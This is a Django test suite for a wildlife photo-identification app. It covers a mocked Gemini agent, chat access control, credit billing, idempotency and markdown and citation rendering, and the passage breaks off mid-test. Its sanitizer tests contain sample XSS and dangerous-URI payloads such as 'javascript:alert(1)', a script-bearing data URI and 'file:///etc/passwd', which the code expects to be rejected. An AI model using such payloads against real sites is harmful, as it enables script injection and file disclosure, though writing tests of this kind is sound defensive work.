            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "इसके भोजन के बारे में हिंदी में समझाएं"}),
            content_type="application/json"
        )

        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data["success"])
        self.assertIn("बंगाल टाइगर", data["answer"])
        self.assertIn("Panthera tigris", data["answer"])

    @patch("animal.views.run_wildlife_agent")
    def test_assistant_chat_context_preservation(self, mock_agent):
        """Verify bounded conversation history and active specimen details are passed to agent."""
        mock_agent.return_value = {
            "messages": [AIMessage(content="They roam dense mangrove forests in the Sundarbans.")],
            "final_result": {"wildlife_information": "They roam dense mangrove forests in the Sundarbans."},
            "source_references": []
        }

        self.client.login(username="bot_user_1", password="StrongPassword123!")
        self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "Where are they found in India?"}),
            content_type="application/json"
        )

        # Inspect arguments passed to run_wildlife_agent
        self.assertTrue(mock_agent.called)
        call_kwargs = mock_agent.call_args.kwargs
        self.assertEqual(call_kwargs["request_type"], "chat")
        self.assertEqual(call_kwargs["user_message"], "Where are they found in India?")

        history = call_kwargs["conversation_history"]
        # History contains system context header plus initial assistant message
        self.assertTrue(any("Bengal Tiger" in m.content for m in history))

    def test_assistant_chat_user_isolation(self):
        """Verify User 2 cannot access or post to User 1's conversation."""
        self.client.login(username="bot_user_2", password="StrongPassword123!")
        response = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "Hacking inquiry"}),
            content_type="application/json"
        )

        self.assertEqual(response.status_code, 404)
        data = response.json()
        self.assertFalse(data["success"])
        self.assertIn("Conversation not found or access denied", data["error"])
        # Verify no messages added to conv1
        self.assertEqual(self.conv1.messages.count(), 1)

    def test_assistant_chat_empty_and_oversized_validation(self):
        """Verify empty and oversized (>1000 chars) messages are rejected with 400."""
        self.client.login(username="bot_user_1", password="StrongPassword123!")

        # Empty
        res_empty = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "   "}),
            content_type="application/json"
        )
        self.assertEqual(res_empty.status_code, 400)
        self.assertIn("cannot be empty", res_empty.json()["error"])

        # Oversized
        res_long = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "W" * 1005}),
            content_type="application/json"
        )
        self.assertEqual(res_long.status_code, 400)
        self.assertIn("exceeds maximum allowed length", res_long.json()["error"])

    @patch("animal.views.run_wildlife_agent")
    def test_assistant_chat_quota_error_not_persisted(self, mock_agent):
        """Verify Gemini quota error returns 503 and does not save failed assistant reply in SQLite."""
        mock_agent.side_effect = GeminiQuotaError("Gemini API rate limit reached.")

        self.client.login(username="bot_user_1", password="StrongPassword123!")
        response = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "Tell me about tigers"}),
            content_type="application/json"
        )

        self.assertEqual(response.status_code, 503)
        data = response.json()
        self.assertFalse(data["success"])
        self.assertIn("rate limit", data["error"])

        # Invariant: failed AI reply is NOT persisted
        self.assertEqual(self.conv1.messages.filter(role="user").count(), 0)
        self.assertEqual(self.conv1.messages.count(), 1)

    @patch("animal.views.run_wildlife_agent")
    def test_assistant_chat_timeout_error_not_persisted(self, mock_agent):
        """Verify Gemini timeout error returns 503 and does not save failed reply in SQLite."""
        mock_agent.side_effect = GeminiTimeoutError("Agent invocation timed out after 30 seconds.")

        self.client.login(username="bot_user_1", password="StrongPassword123!")
        response = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": self.conv1.id, "message": "Tell me about tigers"}),
            content_type="application/json"
        )

        self.assertEqual(response.status_code, 503)
        self.assertFalse(response.json()["success"])
        self.assertEqual(self.conv1.messages.count(), 1)


# ===========================================================================
# 6. Phase 6 UI Modernization, Bootstrap Icons & Accessibility Tests
# ===========================================================================

class UIModernizationTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="ui_test_user",
            email="ui_user@example.com",
            password="StrongPassword123!"
        )
        self.profile = self.user.profile
        self.profile.wallet_balance = Decimal("15.00")
        self.profile.total_predictions = 1
        self.profile.save()
        self.test_img = create_test_image(filename="ui_specimen.png")
        self.prediction = AnimalPrediction.objects.create(
            user=self.user,
            uploaded_image=self.test_img,
            common_name="Bengal Tiger",
            scientific_name="Panthera tigris tigris",
            confidence=95.0,
            credit_used=1.0,
            identification_status="identified",
            identification_notes="Apex predator with distinctive black vertical stripes.",
            visual_clues=["Vertical dark stripes", "Reddish-orange coat"],
            alternative_species=["Panthera pardus"],
            wildlife_information={"summary": "Tigers are apex predators essential for forest ecosystems."},
            source_references=[{"title": "GBIF Panthera tigris", "url": "https://www.gbif.org/species/5219416"}]
        )

    def test_pinned_bootstrap_icons_in_base_template(self):
        """Verify that the official pinned Bootstrap Icons 1.13.2 stylesheet is loaded in base.html."""
        response = self.client.get(reverse("home"))
        self.assertEqual(response.status_code, 200)
        content = response.content.decode("utf-8")
        self.assertIn(
            "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.2/font/bootstrap-icons.min.css",
            content
        )

    def test_zero_emojis_in_rendered_html(self):
        """Verify rendered templates do not contain decorative emoji characters."""
        import re
        emoji_pattern = re.compile(
            r'[\U00010000-\U0010ffff]|[\u2600-\u26FF]|[\u2700-\u27BF]|[\u2300-\u23FF]|[\u2B50-\u2B55]'
        )
        self.client.login(username="ui_test_user", password="StrongPassword123!")

        urls = [
            reverse("home"),
            reverse("predict"),
            reverse("history"),
            reverse("prediction_detail", args=[self.prediction.id]),
            reverse("dashboard"),
            reverse("profile"),
            reverse("contact"),
        ]

        for u in urls:
            res = self.client.get(u)
            self.assertEqual(res.status_code, 200, f"URL {u} failed with status {res.status_code}")
            html = res.content.decode("utf-8")
            emojis = emoji_pattern.findall(html)
            self.assertEqual(
                emojis,
                [],
                f"Decorative emojis found in rendered output of {u}: {emojis}"
            )

    def test_prediction_image_url_property_and_template_compat(self):
        """Verify AnimalPrediction.image_url property provides seamless template compatibility."""
        self.assertIsNotNone(self.prediction.image_url)
        self.assertEqual(self.prediction.image_url, self.prediction.uploaded_image)
        self.assertEqual(self.prediction.image, self.prediction.uploaded_image)

    def test_predict_page_contains_dragdrop_and_preview_elements(self):
        """Verify that the predict page template contains drag-and-drop dropzone, preview, and client validation elements."""
        self.client.login(username="ui_test_user", password="StrongPassword123!")
        response = self.client.get(reverse("predict"))
        self.assertEqual(response.status_code, 200)
        content = response.content.decode("utf-8")
        self.assertIn("upload-dropzone", content)
        self.assertIn("previewImage", content)
        self.assertIn("submitSpinner", content)
        self.assertIn("bi bi-camera", content)

    def test_prediction_detail_contains_chat_and_suggested_chips(self):
        """Verify that prediction_detail page renders the contextual conversational assistant and suggested chips."""
        self.client.login(username="ui_test_user", password="StrongPassword123!")
        response = self.client.get(reverse("prediction_detail", args=[self.prediction.id]))
        self.assertEqual(response.status_code, 200)
        content = response.content.decode("utf-8")
        self.assertIn("chat-container", content)
        self.assertIn("suggested-chip", content)
        self.assertIn("chat-typing-indicator", content)
        self.assertIn("bi bi-send-fill", content)

    def test_history_page_renders_stat_pills_and_table(self):
        """Verify that history page renders stat pills and table with status badge."""
        self.client.login(username="ui_test_user", password="StrongPassword123!")
        response = self.client.get(reverse("history"))
        self.assertEqual(response.status_code, 200)
        content = response.content.decode("utf-8")
        self.assertIn("stat-pill", content)
        self.assertIn("table-modern", content)
        self.assertIn("Bengal Tiger", content)
        self.assertIn("badge-status-identified", content)

    def test_profile_page_renders_wallet_and_demo_plans(self):
        """Verify profile/dashboard renders digital wallet card, demo plans, and action CTAs."""
        self.client.login(username="ui_test_user", password="StrongPassword123!")
        response = self.client.get(reverse("profile"))
        self.assertEqual(response.status_code, 200)
        content = response.content.decode("utf-8")
        self.assertIn("Digital Wallet", content)
        self.assertIn("₹15.00", content)
        self.assertIn("College Demo Wallet Recharge Plans", content)


# ===========================================================================
# 7. Phase 7 Demo Credits, Idempotency & Integration Tests
# ===========================================================================


class Phase7DemoCreditsIntegrationTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="phase7_tester",
            email="phase7@example.com",
            password="StrongPassword123!"
        )
        self.profile = self.user.profile
        self.profile.wallet_balance = Decimal("5.00")
        self.profile.save()

    @patch("animal.views.run_wildlife_agent")
    def test_duplicate_submission_is_idempotent_no_duplicate_charge(self, mock_agent):
        """Rule D: Duplicate submissions with the same request_id return cached prediction without re-charging credits."""
        mock_agent.return_value = {
            "final_result": {
                "identification_status": "identified",
                "common_name": "Indian Leopard",
                "scientific_name": "Panthera pardus fusca",
                "visual_clues": ["Rosette pattern"],
                "alternative_species": [],
                "wildlife_information": "Leopard information",
                "source_references": [],
            },
            "identification": {
                "is_animal": True,
                "identification_status": "identified",
                "common_name": "Indian Leopard",
            },
            "tool_call_count": 1,
            "messages": []
        }
        self.client.login(username="phase7_tester", password="StrongPassword123!")

        req_id = "phase7-idempotency-token-12345"

        # First POST
        img1 = create_test_image(filename="leopard1.png")
        res1 = self.client.post(reverse("predict"), {"image": img1, "request_id": req_id})
        self.assertEqual(res1.status_code, 200)

        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))
        self.assertEqual(AnimalPrediction.objects.filter(user=self.user).count(), 1)
        self.assertEqual(mock_agent.call_count, 1)

        # Duplicate POST with same request_id
        img2 = create_test_image(filename="leopard2.png")
        res2 = self.client.post(reverse("predict"), {"image": img2, "request_id": req_id})
        self.assertEqual(res2.status_code, 200)

        # Invariants: No second agent call, no second prediction created, no second charge
        self.assertEqual(mock_agent.call_count, 1)
        self.assertEqual(AnimalPrediction.objects.filter(user=self.user).count(), 1)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

    def test_viewing_previous_predictions_is_free(self):
        """Rule 3: Viewing previous predictions costs 0 credits."""
        pred = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Tiger",
            uploaded_image=create_test_image(filename="tiger.png"),
            identification_status="identified"
        )
        self.client.login(username="phase7_tester", password="StrongPassword123!")
        res = self.client.get(reverse("prediction_detail", args=[pred.id]))
        self.assertEqual(res.status_code, 200)

        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("5.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_followup_chat_messages_are_free(self, mock_agent):
        """Rule 4: Follow-up conversational chat messages do not deduct credits."""
        pred = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Tiger",
            uploaded_image=create_test_image(filename="tiger.png"),
            identification_status="identified"
        )
        conv = WildlifeConversation.objects.create(user=self.user, prediction=pred)
        mock_agent.return_value = {
            "messages": [AIMessage(content="Tigers eat deer, wild boar, and water buffalo in the wild.")]
        }

        self.client.login(username="phase7_tester", password="StrongPassword123!")
        res = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": conv.id, "message": "What is their wild diet?"}),
            content_type="application/json"
        )
        self.assertEqual(res.status_code, 200)
        self.assertTrue(res.json()["success"])

        # Invariant: Wallet balance remains unchanged
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("5.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_insufficient_credits_blocks_prediction_without_calling_gemini(self, mock_agent):
        """Rule 8: Insufficient credits (< ₹1.00) prevents execution without calling Gemini agent."""
        self.profile.wallet_balance = Decimal("0.00")
        self.profile.save()

        self.client.login(username="phase7_tester", password="StrongPassword123!")
        img = create_test_image(filename="blocked.png")
        res = self.client.post(reverse("predict"), {"image": img})

        self.assertEqual(res.status_code, 200)
        self.assertEqual(mock_agent.call_count, 0)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("0.00"))


# ===========================================================================
# 9. Phase 8 Comprehensive Verification & Test Categories
# ===========================================================================

class Phase8ImageIdentificationAndVivaTests(TestCase):
    """
    Exhaustive verification of Image Identification test categories (D)
    and complete application life cycle features (E) for B.Tech demonstration.
    """

    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="student_demonstrator",
            email="student@wildlens.college.edu",
            password="StrongCollegePass2026!"
        )
        self.profile = self.user.profile
        self.client.login(username="student_demonstrator", password="StrongCollegePass2026!")

    @patch("animal.views.run_wildlife_agent")
    def test_category_tiger_identification(self, mock_agent):
        """Test Category 1: Single apex feline specimen (Bengal Tiger / Panthera tigris)."""
        mock_agent.return_value = {
            "identification": {
                "common_name": "Bengal Tiger",
                "scientific_name": "Panthera tigris tigris",
                "identification_status": "identified",
                "visual_clues": ["Prominent reddish-orange coat", "Black vertical stripes", "White ventral area"],
                "alternative_species": ["Siberian Tiger"],
                "identification_note": "Unmistakable stripe pattern and muscular build diagnostic of Panthera tigris."
            },
            "final_result": {
                "identification_status": "identified",
                "common_name": "Bengal Tiger",
                "scientific_name": "Panthera tigris tigris",
                "visual_clues": ["Prominent reddish-orange coat", "Black vertical stripes", "White ventral area"],
                "alternative_species": ["Siberian Tiger"],
                "wildlife_information": "The Bengal tiger is an apex obligate carnivore native to the Indian subcontinent.",
                "source_references": [{"title": "Panthera tigris", "url": "https://www.gbif.org/species/5219404", "source": "GBIF"}]
            }
        }

        image = create_test_image(filename="bengal_tiger.png")
        res = self.client.post(reverse("predict"), {"image": image})
        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")

        pred = AnimalPrediction.objects.filter(user=self.user, common_name="Bengal Tiger").first()
        self.assertIsNotNone(pred)
        self.assertEqual(pred.scientific_name, "Panthera tigris tigris")
        self.assertEqual(pred.identification_status, "identified")
        self.assertEqual(len(pred.visual_clues), 3)
        self.assertEqual(len(pred.source_references), 1)

        # 1 credit deducted (5.00 -> 4.00)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_category_lion_identification(self, mock_agent):
        """Test Category 2: African Lion (Panthera leo) specimen with mane and morphology."""
        mock_agent.return_value = {
            "identification": {
                "common_name": "African Lion",
                "scientific_name": "Panthera leo",
                "identification_status": "identified",
                "visual_clues": ["Tawny-yellow coat", "Prominent dark mane around neck", "Tufted tail"],
                "alternative_species": ["Asiatic Lion"],
                "identification_note": "Adult male African Lion identified by dense mane and robust muscular structure."
            },
            "final_result": {
                "identification_status": "identified",
                "common_name": "African Lion",
                "scientific_name": "Panthera leo",
                "visual_clues": ["Tawny-yellow coat", "Prominent dark mane around neck"],
                "alternative_species": ["Asiatic Lion"],
                "wildlife_information": "Lions are social big cats living in family prides across sub-Saharan savannas.",
                "source_references": [{"title": "Panthera leo", "url": "https://www.gbif.org/species/5219404", "source": "GBIF"}]
            }
        }

        image = create_test_image(filename="african_lion.png")
        res = self.client.post(reverse("predict"), {"image": image})
        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")

        pred = AnimalPrediction.objects.filter(user=self.user, common_name="African Lion").first()
        self.assertIsNotNone(pred)
        self.assertEqual(pred.scientific_name, "Panthera leo")
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_category_elephant_identification(self, mock_agent):
        """Test Category 3: Proboscidean megafauna (Asian Elephant / Elephas maximus)."""
        mock_agent.return_value = {
            "identification": {
                "common_name": "Asian Elephant",
                "scientific_name": "Elephas maximus",
                "identification_status": "identified",
                "visual_clues": ["Twin-domed head", "Relatively small ears with curved tops", "Prehensile trunk"],
                "alternative_species": ["African Bush Elephant (Loxodonta africana)"],
                "identification_note": "Convex back and dual dorsal head humps diagnostic of Elephas maximus."
            },
            "final_result": {
                "identification_status": "identified",
                "common_name": "Asian Elephant",
                "scientific_name": "Elephas maximus",
                "visual_clues": ["Twin-domed head", "Small ears", "Prehensile trunk"],
                "alternative_species": ["African Bush Elephant"],
                "wildlife_information": "The Asian elephant is the largest living land animal in Asia, listed as Endangered on IUCN.",
                "source_references": [{"title": "Elephas maximus", "url": "https://www.gbif.org/species/5219404", "source": "GBIF"}]
            }
        }

        image = create_test_image(filename="asian_elephant.png")
        res = self.client.post(reverse("predict"), {"image": image})
        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")

        pred = AnimalPrediction.objects.filter(user=self.user, common_name="Asian Elephant").first()
        self.assertIsNotNone(pred)
        self.assertEqual(pred.scientific_name, "Elephas maximus")
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_category_bird_identification(self, mock_agent):
        """Test Category 4: Avian specimen (Indian Peafowl / Pavo cristatus)."""
        mock_agent.return_value = {
            "identification": {
                "common_name": "Indian Peafowl",
                "scientific_name": "Pavo cristatus",
                "identification_status": "identified",
                "visual_clues": ["Metallic blue plumage", "Fan-shaped crest of spatula-tipped feathers", "Elongated ocellated upper tail coverts"],
                "alternative_species": ["Green Peafowl (Pavo muticus)"],
                "identification_note": "Brilliant iridescent plumage and crest feathers diagnostic of adult male Indian Peafowl."
            },
            "final_result": {
                "identification_status": "identified",
                "common_name": "Indian Peafowl",
                "scientific_name": "Pavo cristatus",
                "visual_clues": ["Metallic blue plumage", "Fan-shaped crest"],
                "alternative_species": ["Green Peafowl"],
                "wildlife_information": "National bird of India, native to open forest and cultivated riparian edges.",
                "source_references": [{"title": "Pavo cristatus", "url": "https://www.gbif.org/species/2473859", "source": "GBIF"}]
            }
        }

        image = create_test_image(filename="peacock.png")
        res = self.client.post(reverse("predict"), {"image": image})
        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")

        pred = AnimalPrediction.objects.filter(user=self.user, common_name="Indian Peafowl").first()
        self.assertIsNotNone(pred)
        self.assertEqual(pred.scientific_name, "Pavo cristatus")
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_category_multiple_animals(self, mock_agent):
        """Test Category 5: Multi-animal composition (e.g. mixed ungulates at waterhole)."""
        mock_agent.return_value = {
            "identification": {
                "common_name": "Chital (Spotted Deer) & Wild Boar",
                "scientific_name": "Axis axis / Sus scrofa",
                "identification_status": "identified",
                "visual_clues": ["Multiple quadruped specimens present", "White spotted rufous coats", "Coarse dark bristly boars nearby"],
                "alternative_species": ["Hog Deer (Axis porcinus)"],
                "identification_note": "A mixed group of spotted deer and wild boars foraging together in clearing."
            },
            "final_result": {
                "identification_status": "identified",
                "common_name": "Chital (Spotted Deer) & Wild Boar",
                "scientific_name": "Axis axis / Sus scrofa",
                "visual_clues": ["Multiple specimens", "Spotted coats", "Dark bristles"],
                "alternative_species": ["Hog Deer"],
                "wildlife_information": "Sympatric herbivore community frequently observed sharing waterholes in central India.",
                "source_references": [{"title": "Axis axis", "url": "https://www.gbif.org/species/2440939", "source": "GBIF"}]
            }
        }

        image = create_test_image(filename="multiple_animals.png")
        res = self.client.post(reverse("predict"), {"image": image})
        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")

        pred = AnimalPrediction.objects.filter(user=self.user).latest("created_at")
        self.assertIn("Chital", pred.common_name)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_category_unclear_animal(self, mock_agent):
        """Test Category 6: Distant, blurred or occluded animal specimen."""
        mock_agent.return_value = {
            "identification": {
                "common_name": "Uncertain Canid / Mustelid",
                "scientific_name": None,
                "identification_status": "uncertain",
                "visual_clues": ["Low-slung quadruped silhouette", "Bushy tail tip", "Heavy motion blur"],
                "alternative_species": ["Golden Jackal (Canis aureus)", "Indian Fox (Vulpes bengalensis)", "Grey Mongoose"],
                "identification_note": "Specimen is distant and heavily motion-blurred. Definite diagnostic skull markings cannot be resolved."
            },
            "final_result": {
                "identification_status": "uncertain",
                "common_name": "Uncertain Canid / Mustelid",
                "scientific_name": None,
                "visual_clues": ["Low-slung silhouette", "Bushy tail tip"],
                "alternative_species": ["Golden Jackal", "Indian Fox", "Grey Mongoose"],
                "wildlife_information": "Tentative candidate species based on general silhouette; clear diagnostic photo recommended.",
                "source_references": []
            }
        }

        image = create_test_image(filename="unclear_specimen.png")
        res = self.client.post(reverse("predict"), {"image": image})
        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")

        pred = AnimalPrediction.objects.filter(user=self.user).latest("created_at")
        self.assertEqual(pred.identification_status, "uncertain")
        self.assertGreaterEqual(len(pred.alternative_species), 2)
        # Even uncertain animal prediction deducts 1 credit (as real analysis took place)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("4.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_category_no_animal_detected_free_charge(self, mock_agent):
        """Test Category 7: Non-animal photograph (coffee mug / building / landscape) is FREE."""
        mock_agent.return_value = {
            "identification": {
                "common_name": "No Animal Detected",
                "scientific_name": None,
                "identification_status": "not_animal",
                "visual_clues": [],
                "alternative_species": [],
                "identification_note": "No fauna or biological animal specimens detected in this image. Visible objects appear to be inanimate."
            },
            "final_result": {
                "identification_status": "not_animal",
                "common_name": "No Animal Detected",
                "scientific_name": None,
                "visual_clues": [],
                "alternative_species": [],
                "wildlife_information": "No animal detected.",
                "source_references": []
            }
        }

        image = create_test_image(filename="ceramic_mug.png")
        res = self.client.post(reverse("predict"), {"image": image})
        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")

        pred = AnimalPrediction.objects.filter(user=self.user).latest("created_at")
        self.assertEqual(pred.identification_status, "not_animal")
        self.assertEqual(pred.credit_used, 0.0)

        # Invariant: Free of charge per Rule 7 (wallet balance remains 5.00)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("5.00"))

        pred = AnimalPrediction.objects.filter(user=self.user).latest("created_at")
        self.assertEqual(pred.identification_status, "not_animal")
        self.assertEqual(pred.credit_used, 0.0)

        # Invariant: Free of charge per Rule 7 (wallet balance remains 5.00)
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("5.00"))

    def test_category_unsupported_image_format(self):
        """Test Category 8: Non-image / unsupported file (.txt, .pdf) rejected safely without credit deduction."""
        text_file = SimpleUploadedFile("assignment.txt", b"Hello college professor!", content_type="text/plain")
        res = self.client.post(reverse("predict"), {"image": text_file})

        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("5.00"))

    def test_category_corrupted_image_file(self):
        """Test Category 9: Corrupted or truncated image byte stream rejected safely."""
        corrupted_png = SimpleUploadedFile("corrupted.png", b"\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR\x00BADBYTES", content_type="image/png")
        res = self.client.post(reverse("predict"), {"image": corrupted_png})

        self.assertEqual(res.status_code, 200)
        self.assertTemplateUsed(res, "animal/predict.html")
        self.profile.refresh_from_db()
        self.assertEqual(self.profile.wallet_balance, Decimal("5.00"))

    @patch("animal.views.run_wildlife_agent")
    def test_multilingual_hindi_conversation(self, mock_agent):
        """Test Multilingual Hindi support in contextual Q&A conversation."""
        pred = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Bengal Tiger",
            scientific_name="Panthera tigris tigris",
            identification_status="identified",
            uploaded_image=create_test_image(filename="hindi_tiger.png")
        )
        conv = WildlifeConversation.objects.create(user=self.user, prediction=pred)

        hindi_reply = "बाघ भारत का राष्ट्रीय पशु है। यह मुख्य रूप से चीतल, सांभर और जंगली सुअर का शिकार करता है।"
        mock_agent.return_value = {
            "messages": [AIMessage(content=hindi_reply)]
        }

        res = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": conv.id, "message": "यह क्या खाता है? हिंदी में बताएं"}),
            content_type="application/json"
        )
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data["success"])
        self.assertEqual(data["answer"], hindi_reply)

        # Verify messages stored in SQLite database with UTF-8 encoding
        messages = list(conv.messages.all())
        self.assertEqual(len(messages), 2)
        self.assertEqual(messages[0].role, "user")
        self.assertIn("हिंदी", messages[0].content)
        self.assertEqual(messages[1].role, "assistant")
        self.assertIn("बाघ", messages[1].content)


# ===========================================================================
# 11. Grounded Wildlife Dossier Extraction, Formatting, & Security Tests
# ===========================================================================

class DossierExtractionAndRenderingTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="dossier_ranger",
            email="ranger@wildlens.org",
            password="StrongPassword123!"
        )
        self.client.login(username="dossier_ranger", password="StrongPassword123!")

    def test_plain_string_responses(self):
        """1. Plain string responses pass through extract_clean_message_text cleanly."""
        plain = "The Scarlet Macaw is native to tropical Central and South America."
        cleaned = extract_clean_message_text(plain)
        self.assertEqual(cleaned, plain)

        rendered = render_markdown_safe(plain)
        self.assertIn("<p>The Scarlet Macaw is native to tropical Central and South America.</p>", rendered)

    def test_aimessage_content_blocks(self):
        """2. AIMessage with list of content blocks correctly extracts combined readable text."""
        blocks = [
            {"type": "text", "text": "### Taxonomic Classification\nAra macao belongs to Psittacidae."},
            {"type": "text", "text": "It has vivid red, yellow, and blue plumage."}
        ]
        msg = AIMessage(content=blocks)
        cleaned = extract_clean_message_text(msg)
        self.assertIn("### Taxonomic Classification", cleaned)
        self.assertIn("Ara macao belongs to Psittacidae.", cleaned)
        self.assertIn("It has vivid red, yellow, and blue plumage.", cleaned)
        self.assertNotIn("type", cleaned)
        self.assertNotIn("extras", cleaned)

        # Also test passing blocks list directly
        cleaned_list = extract_clean_message_text(blocks)
        self.assertEqual(cleaned, cleaned_list)

    def test_provider_metadata_exclusion(self):
        """3. Provider metadata (extras, signature, thought signatures) is excluded from user-facing text."""
        complex_block = [
            {
                "type": "text",
                "text": "The Bengal Tiger (Panthera tigris tigris) is an apex predator.",
                "extras": {
                    "signature": "AQ==k789X0aBcDeFgHiJkLmNoPqRsTuVwXyZ",
                    "citation_sources": ["provider_internal_index_44"],
                    "model_turn": 2
                }
            }
        ]
        msg = AIMessage(content=complex_block)
        cleaned = extract_clean_message_text(msg)

        self.assertEqual(cleaned, "The Bengal Tiger (Panthera tigris tigris) is an apex predator.")
        self.assertNotIn("AQ==", cleaned)
        self.assertNotIn("signature", cleaned)
        self.assertNotIn("provider_internal_index_44", cleaned)
        self.assertNotIn("model_turn", cleaned)
        self.assertNotIn("extras", cleaned)

    def test_markdown_headings_and_formatting(self):
        """4. Standard Markdown elements (headings, bold, italic, lists, tables) render as valid HTML."""
        markdown_text = (
            "### Species Profile: Red Panda\n\n"
            "**Scientific Name:** *Ailurus fulgens*\n\n"
            "- Native to the eastern Himalayas\n"
            "- Feeds predominantly on **bamboo**\n\n"
            "| Attribute | Value |\n"
            "|---|---|\n"
            "| Status | Endangered |\n"
            "| Family | Ailuridae |"
        )
        rendered = render_markdown_safe(markdown_text)

        # Verify HTML tags generated
        self.assertIn("<h3>Species Profile: Red Panda</h3>", rendered)
        self.assertIn("<strong>Scientific Name:</strong>", rendered)
        self.assertIn("<em>Ailurus fulgens</em>", rendered)
        self.assertIn("<ul>", rendered)
        self.assertIn("<li>Native to the eastern Himalayas</li>", rendered)
        self.assertIn("<li>Feeds predominantly on <strong>bamboo</strong></li>", rendered)
        self.assertIn("<table>", rendered)
        self.assertIn("<th>Attribute</th>", rendered)
        self.assertIn("<td>Endangered</td>", rendered)

        # Verify raw markdown markers were consumed
        self.assertNotIn("### Species Profile", rendered)
        self.assertNotIn("**Scientific Name:**", rendered)

    def test_valid_citations(self):
        """5. Valid external citations (GBIF, Wikipedia, EOL) are validated and sanitized."""
        raw_sources = [
            {"title": "GBIF Species 2479532", "url": "https://www.gbif.org/species/2479532", "source": "GBIF"},
            {"title": "Wikipedia Ara macao", "url": "https://en.wikipedia.org/wiki/Scarlet_macaw", "source": "Wikipedia"},
            "https://eol.org/pages/1049285"
        ]
        sanitized = sanitize_source_references(raw_sources)
        self.assertEqual(len(sanitized), 3)

        self.assertEqual(sanitized[0]["url"], "https://www.gbif.org/species/2479532")
        self.assertEqual(sanitized[0]["title"], "GBIF Species 2479532")
        self.assertEqual(sanitized[0]["source"], "GBIF")

        self.assertEqual(sanitized[1]["url"], "https://en.wikipedia.org/wiki/Scarlet_macaw")

        self.assertEqual(sanitized[2]["url"], "https://eol.org/pages/1049285")
        self.assertIn("eol.org", sanitized[2]["title"])

        # Template filter check
        filtered = valid_sources(raw_sources)
        self.assertEqual(len(filtered), 3)

    def test_malformed_source_links(self):
        """6. Malformed, local, javascript, or dangerous source links are rejected."""
        dangerous_sources = [
            {"title": "XSS attack", "url": "javascript:alert(1)"},
            {"title": "Data URI", "url": "data:text/html,<script>alert(1)</script>"},
            {"title": "File URI", "url": "file:///etc/passwd"},
            {"title": "Relative path", "url": "/internal/secret"},
            {"title": "Malformed netloc", "url": "http://"},
            {"title": "Empty URL", "url": ""},
            {"title": "No URL"},
        ]
        sanitized = sanitize_source_references(dangerous_sources)
        self.assertEqual(len(sanitized), 0)

        # Verify URL validator function
        self.assertFalse(is_valid_source_url("javascript:alert('pwned')"))
        self.assertFalse(is_valid_source_url("data:text/html;base64,PHNjcmlwdD4="))
        self.assertFalse(is_valid_source_url("file:///C:/Windows/System32"))
        self.assertFalse(is_valid_source_url("/home/user/test"))
        self.assertFalse(is_valid_source_url(""))
        self.assertTrue(is_valid_source_url("https://www.iucnredlist.org/species/5926/11904128"))
        self.assertTrue(is_valid_source_url("http://eol.org/pages/1049285"))

        # Verify Markdown renderer neutralizes javascript: links
        md_with_js = "[Click for facts](javascript:alert(1))"
        rendered = render_markdown_safe(md_with_js)
